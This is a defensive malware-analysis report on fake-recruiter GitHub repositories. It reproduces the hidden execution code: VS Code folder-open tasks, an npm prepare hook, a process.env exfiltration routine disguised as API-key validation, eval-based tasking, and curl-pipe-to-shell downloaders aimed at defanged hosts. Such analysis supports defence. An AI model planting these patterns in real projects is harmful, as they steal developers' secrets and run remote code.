---
title: "Interexy-Branded Gamifly Repositories: Evolution of the BetPoker Loader into a Vercel-Gated Node.js Tasking Implant"
date: 2026-06-09
author: "ThreatProphet"
description: "Analysis of two byte-identical Gamifly GitHub repositories delivered through a LinkedIn and Calendly recruitment workflow. The repositories reuse the BetPoker/Dravion loader architecture, automatically launch a backend through VS Code and npm lifecycle mechanisms, exfiltrate the complete Node.js environment to a Vercel gate, and execute an obfuscated five-second tasking implant. Follow-on hunting identified AjunaVerse and AlchemyMVP as later sibling branches of the same weaponized Git lineage."
tags:
  - contagious-interview
  - fake-developer-recruitment
  - linkedin-lure
  - calendly
  - github-repository
  - vscode
  - npm
  - javascript
  - node-js
  - environment-theft
  - vercel
  - backdoor
  - dprk-linked
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1059.003
  - T1059.004
  - T1059.007
  - T1027
  - T1140
  - T1036
  - T1105
  - T1071.001
  - T1082
  - T1016
  - T1119
  - T1552.001
  - T1041
report_id: "TP-2026-016"
showToc: true
---

> *"The game stayed the same; only the organization name, gate, and dealer address changed."*

## Executive Summary

This report analyzes an **Interexy-branded fake developer recruitment operation** that delivered a GitHub repository named `Gamifly` during a remote interview workflow. The engagement began with a LinkedIn job offer, moved to Calendly for interview scheduling, and culminated in a repository link shared during the call. A subsequent GitHub search identified a second repository under a slightly different organization name:

```text
hxxps://github[.]com/interexyorg/Gamifly
hxxps://github[.]com/Interexywork/Gamifly
```

Forensic acquisition showed that the two repositories were not merely similar forks. Their Git object databases were identical: both archives contained the same packfile, the same 1,651 packed objects, the same `main` reference, the same HEAD commit, and the same HEAD tree. Only the configured origin URL differed. This establishes that the two GitHub organizations distributed exact copies of the same repository state.

The repository presents itself as an AI-enabled Web3 gaming platform, but its source tree and Git history show that it is a repurposed poker application. Current files retain Texas Hold'em, card, chip, seat, pot, and poker-solver logic. Commit subjects include `update test_poker_v1`, `change ChipAmountPill.js`, `Add Card Class`, `game logic`, and `fix chips.js`. This lineage links the lure directly to the poker-themed repository pattern documented in ThreatProphet's March 2026 **BetPoker** investigation.

The current Gamifly repository contains multiple execution mechanisms. Opening it in Visual Studio Code can trigger hidden `folderOpen` tasks that first run `npm install --silent --no-progress` and then launch `node server.js`. Independently, the root `package.json` defines an npm `prepare` lifecycle script that starts the server during installation. Consequently, opening the workspace with automatic tasks enabled or manually following the installation instructions can execute the backend before the user performs any meaningful code review.

The backend loads both `.env` and `.env.local`, imports the authentication route, and immediately invokes a function presented as API-key validation. In reality, the routine base64-decodes `AUTH_API`, POSTs the entire `process.env` object to a Vercel-hosted endpoint with the custom header `x-app-request: ip-check`, and executes the response body with:

```js
const executor = new Function("require", response.data);
executor(require);
```

A controlled request to the decoded endpoint recovered a 3,704-byte obfuscated Node.js payload. Static deobfuscation showed that it collects the hostname, operating system, and first non-loopback IPv4 MAC address; serializes the complete runtime environment again; and sends both datasets to:

```text
hxxp://136.243.22[.]62:1224/api/checkStatus
```

The implant polls every five seconds using a server-assigned `sysId`. When the JSON response contains `status: "error"`, it executes the `message` field through `eval()`. A controlled protocol reproduction received a live standby response and a UUID:

```json
{"status":"ok","message":"server connected","sysId":"ebc95449-34af-4ed5-858c-5c0682872492"}
```

No operator task was returned during collection. That does not reduce the malicious assessment: the repository has already exfiltrated the environment, remotely loaded JavaScript, and installed a persistent five-second tasking channel capable of arbitrary in-process JavaScript execution.

The loader is best assessed as an **evolution and reuse of the BetPoker/Dravion toolkit**, not as an unrelated new family. Several current files are exact SHA-256 matches for artifacts documented in previous ThreatProphet cases, including `.env.local`, `config/loadEnv.js`, `routes/index.js`, and `routes/api/auth.js`. The distinctive protocol also remains stable: base64 `AUTH_API`, full `process.env` POST, `x-app-request: ip-check`, `new Function("require", response.data)`, registrar-style beaconing, server-issued `sysId`, and conditional execution of C2-provided JavaScript. The main changes are delivery refinement, Vercel endpoint rotation, campaign-marker rotation, and a new C2 IP on the repeatedly observed port `1224`.

Follow-on hunting conducted after the initial Gamifly analysis identified two additional public repositories, `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP`, that contain exact Git commit objects from the Gamifly history. At the time of review, both sibling repositories implemented a newer execution design: automatic platform-specific downloads from `vscode-settings-529[.]vercel[.]app`, the same npm `prepare` background-launch mechanism, and an embedded version of the five-second registrar/tasking implant directed to `138.201.128[.]169:1224`. These repositories were not delivered during the Interexy-branded interview; they are included as follow-on evidence of a repeatable repository-production pipeline and continued loader evolution.

The technical linkage to the earlier ThreatProphet cluster is assessed with **high confidence**. Consistency with broader Contagious Interview / DPRK-linked fake-developer-recruitment tradecraft is assessed with **medium confidence**. Attribution to a specific state actor remains **low-to-medium confidence** because no single artifact proves operator identity. References to Interexy describe observed branding and GitHub organization names; they do not establish participation by the legitimate company or any real employee.

## Evidence Basis and Scope

This report is based on:

- investigator notes describing a LinkedIn approach, Calendly scheduling, interview call, and repository delivery;
- forensic Git mirror archives of both Gamifly repositories;
- repository HEAD, refs, and complete commit metadata;
- static review of the repository tree and selected historical commits;
- static deobfuscation of the Vercel-delivered Node.js payload;
- controlled retrieval of the Vercel response;
- controlled reproduction of the tasking protocol without executing returned code;
- preserved HTTP headers, response bodies, hashes, and scan output;
- comparison with prior ThreatProphet BetPoker and Dravion-Core investigations;
- follow-on public review of the current AjunaVerse and AlchemyMVP branches and verification of shared Git commit objects.

No C2-provided JavaScript was executed during analysis. The tasking endpoint was queried with controlled data to reproduce the implant protocol and preserve its standby response. The investigation did not obtain a C2 response with `status: "error"`; therefore, any operator-selected post-enrollment module remains unrecovered.

The supplied evidence does not include the original LinkedIn screenshots, LinkedIn profile URL, the original chat message containing the repository link, or a recording/transcript of the call. Those omissions limit identity and social-engineering reconstruction but do not affect the technical verdict because the malicious repository, delivery gate, returned implant, and live tasking endpoint were independently preserved.

The follow-on AjunaVerse and AlchemyMVP findings are based on public GitHub content observed on June 9, 2026, not on forensic mirror acquisitions. Their current files and shared commit objects were independently reviewed, but remote repository state may change after publication.

**Brand-use notice:** the names `Interexy`, `interexyorg`, and `Interexywork` refer to observed lure branding and GitHub organization names. This report does not establish that the legitimate Interexy company, its personnel, or any similarly named third party created, controlled, or knowingly supported the repositories. The most defensible interpretation is impersonation or brand misuse unless independent evidence proves otherwise.

Claims are separated into three categories:

- **Directly observed:** present in acquired Git objects, repository files, captured payloads, HTTP responses, hashes, or investigator notes.
- **Behavioral assessment:** inferred from static analysis of code paths and payload logic.
- **External/campaign context:** based on exact artifact matches and protocol overlap with prior public ThreatProphet reporting, but not used alone to prove actor identity.

## Key Findings

| Finding | Assessment |
|---|---|
| Initial approach | LinkedIn job offer followed by Calendly scheduling and a remote interview |
| Interview email | `blakesmith.bz@gmail[.]com`, confirmed by the preserved invitation |
| Delivered project | `Gamifly`, presented as a Web3 gaming platform |
| Repository duplicates | `interexyorg/Gamifly` and `Interexywork/Gamifly` |
| Duplicate confidence | Exact Git object-level duplicates; only origin URL differed |
| HEAD commit | `d86eff13748e4680b05f22a726323b9cdb00c077` |
| HEAD tree | `971cbac39a1bd57fe8fed8c7721302b3a1e1f7b0` |
| Packed object count | 1,651 in each mirror |
| Shared packfile SHA-256 | `ed6951320edd99bfdafefe106eaa97fff37e34539f25d95d9206432d0f8b5427` |
| Original application lineage | Poker / Texas Hold'em game codebase |
| Automatic execution | VS Code `runOn: folderOpen` tasks |
| Additional execution | npm `prepare` lifecycle launches `server.js` during installation |
| Environment loading | `.env` and `.env.local` loaded into `process.env` |
| Delivery gate | `hxxps://ip-testcheck[.]vercel[.]app/api` |
| Gate header | `x-app-request: ip-check` |
| Initial collection | Entire `process.env` object POSTed to Vercel |
| Remote execution | `new Function("require", response.data)` |
| Recovered payload | Obfuscated Node.js registrar/tasking implant |
| Implant C2 | `136.243.22[.]62:1224/api/checkStatus` |
| Beacon interval | 5 seconds |
| Implant campaign marker | `Y3Jhc2ggdGhlIGJhZCBndXlz` → `crash the bad guys` |
| Task execution | `eval(message)` when C2 returns `status: "error"` |
| Captured tasking state | Live standby response with server-assigned UUID |
| Prior-case relationship | Exact artifact and protocol reuse from BetPoker/Dravion cluster |
| Follow-on Git lineage | `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP` contain exact Gamifly commit objects |
| Follow-on execution evolution | Platform-specific Vercel downloader plus npm `prepare` and embedded registrar beacon |
| Follow-on tasking C2 | `138.201.128[.]169:1224/api/checkStatus` |
| Technical cluster confidence | High |
| DPRK-linked attribution confidence | Low-to-medium |

---

## Attack Overview

### Initial Contact and Repository Delivery

According to contemporaneous investigator notes, the operation followed the now-familiar fake developer recruitment sequence:

```text
LinkedIn job offer
  -> Calendly interview scheduling
  -> remote interview call
  -> GitHub repository link shared during the call
  -> target asked to review or run the project
```

The notes identify the invitation email as:

```text
blakesmith.bz@gmail[.]com
```

The first repository was associated with an Interexy-themed organization. A quick GitHub search identified a second repository using a slightly different organization name but the same project:

```text
hxxps://github[.]com/interexyorg/Gamifly
hxxps://github[.]com/Interexywork/Gamifly
```

This duplication is operationally meaningful. It provides redundancy if one organization or repository is reported, removed, rate-limited, or viewed as suspicious during an interview. It also makes the lure appear more credible to a target who performs only a superficial search.

### Exact Duplicate Repository Assessment

Both repositories were acquired as Git mirrors on June 4, 2026. The compressed archive hashes differ because the mirror configuration records a different origin URL, but the repository content is otherwise identical.

Both mirrors contain:

```text
refs/heads/main -> d86eff13748e4680b05f22a726323b9cdb00c077
HEAD tree       -> 971cbac39a1bd57fe8fed8c7721302b3a1e1f7b0
packed objects  -> 1,651
packfile SHA256 -> ed6951320edd99bfdafefe106eaa97fff37e34539f25d95d9206432d0f8b5427
```

The exported HEAD, refs, and commit-metadata files also hash identically between the two acquisitions. This is stronger than similarity at the working-tree level: it establishes reuse of the same Git object graph, including history and unreachable/referenced objects preserved by the mirror.

The only material repository-level difference observed in the mirrors was the origin URL stored in Git configuration. The duplicate repositories should therefore be treated as two distribution points for one artifact set.

### Poker Lineage and Misleading Current Branding

The current README markets Gamifly as an AI-powered Web3 gaming marketplace and multi-game ecosystem. The application tree, however, retains extensive poker-specific implementation:

```text
Texas Hold'em metadata
pokersolver dependency
Deck, Card, Player, Seat, SidePot, and Table objects
chip and pot logic
poker table UI components
```

Commit subjects reinforce that lineage:

```text
update test_poker_v1
change ChipAmountPill.js
Add Card Class
game logic
fix chips.js
remove cs_sit_down function
```

This is not a case where a few poker strings were accidentally left in a generic template. The repository was substantively developed as a poker application and later wrapped in broader Web3/AI branding.

The Git history contains an additional anomaly. A long earlier history corresponds to the unrelated open-source `tcpie` project. At commit `0b81a59713fabbd43474b471c705ffb74db84fdd`, the tree is replaced wholesale by the poker application, changing hundreds of files and tens of thousands of lines. This indicates grafted, imported, or otherwise misleading history. It must not be interpreted as evidence that the upstream `tcpie` maintainers or identities appearing in the inherited history participated in the malicious repository.

Commit timestamps are also non-monotonic along the parent chain. Some child commits have dates earlier than ancestors, and the HEAD date predates dates recorded on commits beneath it. The DAG and file changes remain useful, but timestamps and author identities should be treated as low-trust metadata rather than reliable operator chronology.

### Kill Chain

```text
LinkedIn recruitment message
  -> Calendly scheduling
  -> interview call
  -> Gamifly GitHub repository shared
  -> target opens repository in VS Code or runs npm install
  -> .vscode/tasks.json runs hidden folderOpen tasks
  -> npm install triggers package.json prepare lifecycle
  -> node server.js starts backend
  -> server.js loads .env and .env.local
  -> routes/index.js imports routes/api/auth.js
  -> auth route invokes validateApiKey() at module load
  -> controllers/auth.js decodes AUTH_API
  -> full process.env POSTed to Vercel with x-app-request: ip-check
  -> Vercel returns obfuscated JavaScript
  -> new Function("require", response.data) executes payload
  -> payload collects host identity and process.env
  -> five-second GET beacon to 136.243.22[.]62:1224/api/checkStatus
  -> C2 assigns sysId and can return JavaScript in message
  -> implant evals message when status == "error"
```

---

## Technical Analysis

### Stage 0: VS Code Folder-Open Execution

The repository contains `.vscode/tasks.json` with two tasks configured to run when the folder opens.

The first task silently installs root dependencies:

```json
{
  "label": "install-root-modules",
  "type": "shell",
  "command": "npm install --silent --no-progress",
  "runOptions": {
    "runOn": "folderOpen"
  },
  "presentation": {
    "reveal": "never",
    "echo": false,
    "focus": false,
    "showReuseMessage": false,
    "clear": true
  }
}
```

The second task launches the backend after the install task:

```json
{
  "label": "run-backend",
  "type": "shell",
  "command": "node server.js",
  "dependsOn": "install-root-modules",
  "runOptions": {
    "runOn": "folderOpen"
  },
  "presentation": {
    "reveal": "never",
    "echo": false,
    "focus": false,
    "showReuseMessage": false,
    "clear": true
  },
  "isBackground": true,
  "problemMatcher": []
}
```

Windows uses `cmd.exe /c`; Linux and macOS use `/bin/zsh -c`. The terminal is never revealed, command echo is disabled, focus remains on the editor, and the backend is marked as a background task. These settings reduce the chance that a target notices execution.

Visual Studio Code may prompt before allowing automatic workspace tasks depending on trust and local settings. That safeguard does not remove the risk because the repository also weaponizes npm's normal installation lifecycle.

### Stage 0B: npm `prepare` Execution

The root `package.json` defines:

```json
"prepare": "start /b node server || nohup node server &"
```

The `prepare` lifecycle runs as part of `npm install`. On Windows the command attempts to start the server in the background through `start /b`; on Unix-like systems it falls through to `nohup node server &`.

This creates at least three practical execution routes at the current HEAD:

1. VS Code opens the workspace and automatically launches `install-root-modules`.
2. The install task invokes npm `prepare`, which starts `server.js`.
3. The dependent `run-backend` task starts `server.js` again.
4. A user who manually runs `npm install` also triggers the `prepare` script even outside VS Code.

The README instructs users to install dependencies and later suggests `npm start`, although the root package has no conventional `start` script. The inconsistency does not prevent execution because the malicious path has already fired during installation.

Potential duplicate launches are not harmless. The malicious route is imported before the server begins listening, so the environment POST and payload execution can occur even if a second process later encounters a port conflict. The backend also contains port-selection logic, increasing the likelihood that multiple launches remain viable.

### Stage 0C: Backend Route Chain

The execution path is distributed across otherwise plausible application files:

```text
server.js
  -> require("./config/loadEnv")()
  -> require("./routes")
  -> configureRoutes(app)
  -> routes/index.js imports ./api/auth
  -> routes/api/auth.js calls validateApiKey()
  -> controllers/auth.js performs network request
```

`config/loadEnv.js` loads both committed environment files:

```js
require("dotenv").config({ path: ".env" });
require("dotenv").config({ path: ".env.local" });
```

The current `.env.local` contains credential-shaped decoys:

```text
INFURA_PROJECT_ID=infura-demo-1234567890abcdef
SESSION_SECRET=session_key_123456
INFURA_PROJECT_SECRET=infura-secret-abcdef1234567890
```

The broader `.env` contains numerous additional cloud, Web3, payment, and API-key-shaped values. These values serve two purposes: they make the project look configured, and they produce an environment body resembling a developer workstation with valuable secrets.

The repository's `.gitignore` does not exclude `.env` or `.env.local`, ensuring the bait values are delivered with the project.

### Stage 0D: Disguised API-Key Validation and Environment Exfiltration

The authentication route imports four apparently ordinary helpers:

```js
const {
  getCurrentUser,
  login,
  setApiKey,
  verify
} = require("../../controllers/auth");
```

It then invokes the following routine during module loading:

```js
async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}
```

The names `validateApiKey`, `verify`, and `setApiKey`, together with success/failure log messages, masquerade as normal configuration validation. The controller implementation shows the actual behavior:

```js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });
```

`setApiKey()` does not set an API key; it base64-decodes a URL. `verify()` does not validate a credential; it sends every environment variable available to the Node.js process to the decoded endpoint.

The current value is:

```text
AUTH_API=aHR0cHM6Ly9pcC10ZXN0Y2hlY2sudmVyY2VsLmFwcC9hcGk=
```

Decoded:

```text
hxxps://ip-testcheck[.]vercel[.]app/api
```

The custom request header is:

```http
x-app-request: ip-check
```

The response is executed as JavaScript with access to Node's `require` function. This grants the remote endpoint the same privileges as the victim's Node.js process, including filesystem, process, child-process, network, and operating-system APIs.

A subtle implementation defect is worth documenting. `validateApiKey()` is declared `async` but does not `await` or return the verification chain. A subsequent synchronous truthiness check receives a Promise object, not a boolean. Because a Promise is truthy, the check does not stop route setup. This defect does not prevent the malicious side effect; the network request and response execution still occur asynchronously.

### Stage 1: Controlled Vercel Payload Retrieval

A controlled POST reproduced the repository request using the committed environment structure and required header. The Vercel endpoint returned HTTP 200 and a 3,704-byte body. Preserved headers included:

```text
Server: Vercel
Content-Length: 3704
Content-Type: text/html; charset=utf-8
X-Vercel-Cache: MISS
```

Although labeled `text/html`, the body was obfuscated Node.js JavaScript. Its SHA-256 hash was:

```text
141ba5f2c08dd691c59c8250f13e8e223e8b9bdbcd2756f662ad9d29775a63fb
```

The payload uses a rotated string array and a modified Base64-style decoder. Static deobfuscation recovered the following stable strings and functions:

```text
hostname
networkInterfaces
IPv4
family
mac
internal
type
release
platform
values
flat
find
stringify
base64
utf8
error
```

The embedded C2 string:

```text
aHR0cDovLzEzNi4yNDMuMjIuNjI6MTIyNC9hcGkvY2hlY2tTdGF0dXM=
```

decodes to:

```text
hxxp://136.243.22[.]62:1224/api/checkStatus
```

The implant campaign marker is:

```text
Y3Jhc2ggdGhlIGJhZCBndXlz
```

which decodes to:

```text
crash the bad guys
```

### Stage 1A: Host Profiling

The implant loads Node's `os` module and collects:

- hostname;
- operating-system type;
- operating-system release;
- Node platform identifier;
- the MAC address of the first non-internal IPv4 interface whose MAC is not all zeroes.

The returned object is equivalent to:

```js
{
  hostname,
  macs: [mac],
  os: `${type} ${release} (${platform})`
}
```

This provides a stable host identity for enrollment and tasking.

### Stage 1B: Registrar and Tasking Protocol

Every beacon constructs a URL query with four fields:

```text
sysInfo      JSON-encoded host profile
processInfo  JSON-encoded process.env
tid          Y3Jhc2ggdGhlIGJhZCBndXlz
sysId        0 initially, then server-assigned UUID
```

The request is sent as HTTP GET to `/api/checkStatus`. Sending the environment in a URL query is operationally noisy and may expose values to intermediary logs, proxies, server access logs, browser/network tooling, and monitoring systems in addition to the actor's application.

The response is parsed as:

```js
const { status, message, sysId } = await response.json();
```

Task execution is controlled by:

```js
if (status === "error") {
  try {
    eval(message);
  } catch (_) {}
}
```

Using `error` as the execution status makes the command branch resemble failure handling. The `message` field can contain arbitrary JavaScript and inherits access to the implant's Node.js process.

The implant stores any returned `sysId` and repeats the request every `0x1388` milliseconds:

```text
0x1388 = 5000 ms
```

The payload is therefore best described as a **registrar/tasking implant** or **minimal JavaScript backdoor**, not a passive heartbeat.

### Stage 2: Captured Standby State

A controlled Node.js `fetch()` reproduction received:

```json
{
  "status": "ok",
  "message": "server connected",
  "sysId": "ebc95449-34af-4ed5-858c-5c0682872492"
}
```

The response was served by Express and assigned a unique system identifier. This validates that the endpoint was live, recognized the request schema, and enrolled the synthetic host. It did not return an operator task during the observation window.

The absence of a task can have several explanations: operator-controlled selection, target scoring, IP/geolocation filtering, delayed task assignment, campaign inactivity, or deliberate standby behavior. The evidence supports only the directly observed conclusion: the tasking service was live and returned enrollment state, but no post-enrollment module was recovered.

### Infrastructure Scan Caveat

An Nmap scan of `136.243.22[.]62` produced an implausibly large set of apparently open TCP ports and inconsistent service fingerprints. Such output can result from service emulation, tarpitting, scan interference, transparent middleboxes, or deliberately deceptive responses. It must not be treated as a reliable service inventory.

The investigation independently validated only the behavior directly observed on TCP port `1224`: an Express JSON endpoint implementing `/api/checkStatus`. The PTR observed during collection was:

```text
static.62.22.243.136.clients.your-server.de
```

All other apparent ports require separate protocol-specific validation before use as indicators or infrastructure claims.

---

## Repository Evolution and Loader Refinement

The Git history preserves multiple generations of the delivery mechanism. Because commit dates are unreliable, the following sequence is based on the parent chain and file diffs rather than displayed timestamps.

| Commit | Observed change | Assessment |
|---|---|---|
| `0b81a59713fabbd43474b471c705ffb74db84fdd` | Replaces unrelated `tcpie` tree with poker application | History graft / imported lure codebase |
| `bb879a366cbefe81923c83bbf3b747ea0b2468bd` | Adds `folderOpen` task using direct Vercel `curl | node` execution | Early visible one-step loader |
| `5514628282af67db75cf7c4218d78b33f0e0eb45` | Adds npm `prepare` background server launch | Execution survives outside VS Code |
| `89da1a9d1e0856957afa2217af2241257ac3670f` | Adds hidden install/backend tasks, env files, loader route, full environment POST, custom gate header, and remote execution | Shift to application-integrated loader |
| `aa9abc52b44bc911147d502c80c0e54b1a205f8d` | Restores a direct Vercel folder-open loader while backend path remains | Dual-path execution generation |
| `76bb590bdf7dd413232da22466645d3009f01082` | Rotates direct Vercel task endpoint/token | Infrastructure rotation |
| `8ce9b09673aebf21eb7bffe0b4080e305aacf657` | Returns to indirect hidden install/backend tasks | Current stealthier delivery pattern |

### Early Direct Folder-Open Loader

An earlier `.vscode/tasks.json` executed a Vercel URL directly through Node:

```text
hxxps://0g-auth-check[.]vercel[.]app/api/validate?token=Z4T9QH
```

Later versions rotated the direct endpoint to:

```text
hxxps://oracle-v3-nu[.]vercel[.]app/api/validate?token=Z4T9QH
hxxps://oracle-reg-check[.]vercel[.]app/api/validate?token=8gYk4zLx0pQ1WvH3Rj2BsC7fZ
```

These historical URLs were recovered from Git history. Their present status and payload behavior were not validated during this investigation and should be treated as historical pivots rather than confirmed active infrastructure.

### Application-Integrated Gate Rotation

Once the backend route was weaponized, the same `AUTH_API` design persisted while the Vercel endpoint changed across commits:

```text
hxxps://ip-checking-notification-pic[.]vercel[.]app/api
hxxps://ipcheck-six[.]vercel[.]app/api
hxxps://test-ip-check[.]vercel[.]app/api
hxxps://ip-testcheck[.]vercel[.]app/api
```

This progression shows a modular separation between:

- the repository execution mechanism;
- the Vercel delivery/exfiltration gate;
- the returned registrar/tasking implant;
- the IP-literal tasking server.

The actor can rotate any one layer without rewriting the rest of the chain.

### Evolution Assessment

The current loader is stealthier than the early direct `curl | node` implementation:

- execution is distributed across normal-looking backend files;
- the network request is disguised as API-key validation;
- the endpoint is hidden behind base64 in `.env`;
- `npm install` provides a plausible execution context;
- the VS Code terminal is hidden;
- the Vercel response is executed in memory;
- the tasking C2 can remain dormant until the host is selected.

The repository therefore documents not only reuse but **iterative refinement of the same operational concept**.

---

## Relationship to BetPoker and Dravion-Core

### Exact Artifact Matches

Several current Gamifly files have the same SHA-256 values documented in previous ThreatProphet investigations:

| Artifact | Current SHA-256 | Prior-case relevance |
|---|---|---|
| `.env.local` | `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | Exact BetPoker/Dravion artifact match |
| `config/loadEnv.js` | `c08356a5a4ebbd8804c9acbe2e0c1b986d867b057d2e827ae663e4aec2204ed2` | Exact prior loader-support match |
| `routes/index.js` | `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` | Exact Dravion route-index match |
| `routes/api/auth.js` | `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | Exact BetPoker/Dravion malicious route match |

The full `controllers/auth.js` hash differs from some prior copies because surrounding application code changed, but the malicious primitives remain the same:

```text
atob(AUTH_API)
axios.post(api, { ...process.env })
x-app-request: ip-check
new Function("require", response.data)
```

These exact matches are substantially stronger than a common port, common malware language, or broadly similar recruitment lure.

### Stable Protocol Across Cases

The following behaviors remain stable across the prior cluster and this case:

```text
.env and .env.local are loaded into process.env
AUTH_API contains a base64-encoded Vercel endpoint
full process.env is POSTed to that endpoint
x-app-request: ip-check gates the response
returned JavaScript executes with Node require access
a second payload registers host information
beacon requests include sysInfo, processInfo, tid, and sysId
server assigns sysId
beacon repeats every five seconds
C2-provided JavaScript is executed conditionally
```

### Observed Changes

| Component | Earlier cases | Current Gamifly case |
|---|---|---|
| Lure theme | Poker / Web3 / other developer projects | Repurposed poker project marketed as broad Web3 gaming |
| Organization/repo branding | BetPoker and Dravion-associated repos | Two Interexy-branded organizations with exact duplicate Gamifly repos |
| Vercel gate | Earlier rotating Vercel apps | `ip-testcheck[.]vercel[.]app/api` |
| Tasking C2 | Earlier IPs on port `1224`, including Dravion `88.99.241[.]111` | `136.243.22[.]62:1224` |
| Campaign marker | Prior case-specific `tid` | `crash the bad guys` encoded in Base64 |
| Initial task design | Direct folder-open loaders and backend loaders observed across cases | Historical direct loader evolves into hidden npm/backend route |
| Raw payload hash | Case-specific because endpoint and markers change | New hash due rotated C2 and campaign data |

Raw stage hashes are not expected to match when the embedded C2 or campaign marker changes. The correct family-level linkage rests on exact loader-file hashes, unchanged protocol fields, execution primitives, endpoint paths, polling interval, and control logic.

### Cluster Assessment

The current case is assessed as a continuation of the same broader loader/tooling cluster with **high confidence** because it combines:

1. exact duplicate distribution repositories;
2. confirmed poker lineage;
3. exact cross-case file hashes;
4. the same Vercel gate header and body schema;
5. the same response-execution primitive;
6. the same registrar/tasking protocol;
7. the same five-second cadence;
8. continued use of TCP port `1224` with rotated infrastructure.

This wording is more defensible than claiming that all payload bytes are identical or that a shared port alone proves common control.

---


## Follow-on Git-Lineage Repositories and Post-Gamifly Evolution

Follow-on hunting identified two additional public repositories that preserve the same weaponized Git lineage as Gamifly:

```text
hxxps://github[.]com/LimitBreak-Solutions/AjunaVerse
hxxps://github[.]com/AlchemyGlobal/AlchemyMVP
```

These repositories were discovered through retrospective hunting and were not the repositories delivered during the Interexy-branded interview. They are therefore treated as cluster and evolution evidence, not as part of the original incident delivery chain.

### Exact Git-Object Lineage

The relationship is based on exact Git commit objects rather than theme, filename, or code similarity. Both repositories contain at least the following commits from the Gamifly history:

| Commit | Subject | Significance |
|---|---|---|
| `89da1a9d1e0856957afa2217af2241257ac3670f` | `update Users Token \| testv1` | Introduced the application-integrated loader generation, including environment files, automatic tasks, gate logic, and remote response execution |
| `ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6` | `change routes/api/auth.js` | Earlier modification of the authentication route retained in the shared history |

A Git commit identifier covers the commit tree, parent relationship, author and committer metadata, timestamps, and message. The presence of the same full identifiers therefore establishes shared repository ancestry or direct reuse of the Git object graph. Both follow-on projects also retain the poker application and `pokersolver` dependency beneath new metaverse/Web3 branding.

### Newer Redundant Execution Architecture

At the time of follow-on review, the current `master` branches of AjunaVerse and AlchemyMVP contained the same two execution paths.

First, `.vscode/tasks.json` automatically runs the root dependency installation and separately downloads an operating-system-specific payload:

```text
macOS:  curl -L hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac | bash
Linux:  wget -qO- hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux | sh
Windows: curl --ssl-no-revoke -L hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows | cmd
```

Both tasks use `runOn: "folderOpen"`, suppress command echo, and use a silent terminal presentation. This adds direct shell or command-interpreter execution to the repository-open workflow.

Second, both root manifests retain the npm lifecycle command:

```json
"prepare": "start /b node server || nohup node server &"
```

Consequently, the automatic `npm install` task can also launch the backend in the background. The current authentication route contains the obfuscated registrar/tasking implant directly at module scope rather than first retrieving it through the earlier base64 `AUTH_API` gate.

The effective follow-on execution model is:

```text
Open trusted workspace
  ├─ folderOpen env task
  │   └─ download and execute OS-specific Vercel response
  │
  └─ folderOpen npm install task
      └─ npm prepare lifecycle
          └─ background node server
              └─ import routes/api/auth.js
                  └─ execute embedded registrar/tasking implant
```

### Rotated Follow-on Infrastructure and Marker

Static decoding of the embedded implant recovered:

```text
hxxp://138.201.128[.]169:1224/api/checkStatus
```

The protocol remains consistent with Gamifly:

```text
sysInfo
processInfo
sysId
tid
five-second polling
conditional eval(message) when status == "error"
```

The campaign marker changed to:

```text
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
```

Decoded:

```text
now it time to get everything
```

The persistence of port `1224`, `/api/checkStatus`, the enrollment schema, five-second interval, and conditional JavaScript execution—combined with exact Git-object lineage—supports a high-confidence assessment that these are later sibling branches of the same repository-production and tasking toolkit.

### Evolution Assessment

The follow-on repositories show a meaningful design change from Gamifly. The earlier `.env`-based Vercel gate and disguised API-key validation were removed from the current branches, while the actor added a direct cross-platform downloader and embedded the registrar beacon in an application route that is loaded during backend startup. This creates redundant execution paths and reduces dependence on a single remote gate.

The observed progression is:

```text
Early generation:
  folderOpen Vercel response piped directly to Node

Gamifly generation:
  committed environment decoys
  -> POST process.env to base64 Vercel gate
  -> execute returned JavaScript with new Function()
  -> registrar/tasking beacon

AjunaVerse / AlchemyMVP generation:
  OS-specific Vercel response piped to bash, sh, or cmd
  + npm prepare background launch
  + registrar/tasking beacon embedded directly in auth route
```

This evidence strengthens the assessment that the actor operates a repeatable repository-production pipeline in which a shared poker-derived history is cloned, rebranded, and updated with rotating delivery and tasking infrastructure.

## Git Metadata and Identity Cautions

The repository history contains numerous names and email addresses, including:

```text
tt1089131-cpu <tt1089131@gmail.com>
lxin6793-dot <lxin6793@gmail.com>
aaronhirotobm-lgtm <aaronhiroto.bm@gmail.com>
Matías <mjlescano@protonmail.com>
coin <coinstar@gmail.com>
sparkdev0917 <webvlada2024@gmail.com>
VladimirSimic2024 <webvlada2024@gmail.com>
Mann-004 <randhawamanpreet37@gmail.com>
```

The history also contains identities associated with unrelated upstream open-source work. These values are useful pivots for repository clustering, but they are not verified identities. Git author and committer fields are user-controlled, histories can be grafted, and commits can be backdated. No listed person or account should be described as an operator without independent corroboration.

The repeated use of `webvlada2024@gmail[.]com` across multiple displayed author names is more useful as a technical pivot than the names themselves. Similar caution applies to the invitation email and GitHub organization names.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Evidence |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment approach and interview workflow |
| T1204.002 | User Execution: Malicious File | Execution | Target opens or installs an untrusted repository containing automatic tasks and lifecycle scripts |
| T1059.003 | Windows Command Shell | Execution | VS Code task and npm lifecycle use `cmd.exe` / `start /b` on Windows |
| T1059.004 | Unix Shell | Execution | VS Code and npm lifecycle use Zsh / `nohup` on Linux and macOS |
